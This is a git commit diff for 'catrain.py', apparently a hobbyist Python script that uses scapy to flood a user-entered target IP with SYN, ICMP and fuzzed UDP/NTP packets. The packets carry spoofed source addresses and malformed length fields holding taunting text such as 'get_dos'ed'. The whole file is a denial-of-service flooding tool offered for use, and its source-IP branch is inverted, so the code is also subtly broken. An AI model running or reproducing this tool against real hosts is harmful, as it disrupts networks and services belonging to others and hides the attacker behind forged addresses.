d20860b97de5095127e6a6f8e4f0e922d40209e2
LmaosDev <lmaos@duck.com>
2025-03-26 21:19:11 +1300

    Update catrain.py
    more stuff

--- catrain.py
+++ catrain.py
@@ -1,16 +1,23 @@
-print("ᓚᘏᗢ CATRAIN ᗢᘏᓗ by Lmaos, Queen >⩊<"); 
+print("ᓚᘏᗢ CATRAIN ᗢᘏᓗ by Lmaos, Queen >⩊<") 
 
-from scapy.all import IP, TCP, ICMP, send # type: ignore // pip install scapy --python C:\path\to\python
+from scapy.all import IP, TCP, ICMP, UDP, NTP, send, RawVal, fuzz # type: ignore // pip install scapy --python C:\path\to\python 
 
-target_ip = input("IP: ")
-count = input("Count: ")
-packetT = IP(dst=target_ip) / TCP(flags="S")
-packetI = IP(dst=target_ip) / ICMP()
+target_ip = input("IP: ") 
+count = int(input("Count: ")) 
+srcIp = input("Source IP (opt): ") 
 
-sent_count = 0
+if srcIp != "":
+    packetT = IP(dst=target_ip, len=RawVal(b"get_dos'ed ^w^"), src="192.168.2.34") / TCP(flags="S") 
+else: packetT = IP(dst=target_ip, len=RawVal(b"get_dos'ed ^w^"), src=srcIp) / TCP(flags="S") 
+packetI = IP(dst=target_ip, len=RawVal(b'Hiiiiiiiiii :3c'), src="192.168.2.34") / ICMP() 
+packetU = IP(dst=target_ip, len=RawVal(b"Go have a nice cup of iced tea instead why don't you. Maybe a whisky on the rocks. Who's gonna stop you? Not me, I'm just a dumbass packet"),
+            src="192.168.2.34") / fuzz(UDP()/NTP()) 
+
+sent_count = 0 
 for i in range(count):
-    send(packetT)
-    send(packetI)
-    sent_count += 1
-    print(f"Sent packet {sent_count} to IP {target_ip}")
-input("All sent~~")
+    send(packetT) 
+    send(packetI) 
+    send(packetU) 
+    sent_count += 1 
+    print(f"Sent packet run #{sent_count} to IP {target_ip}") 
+input("All sent~~") 
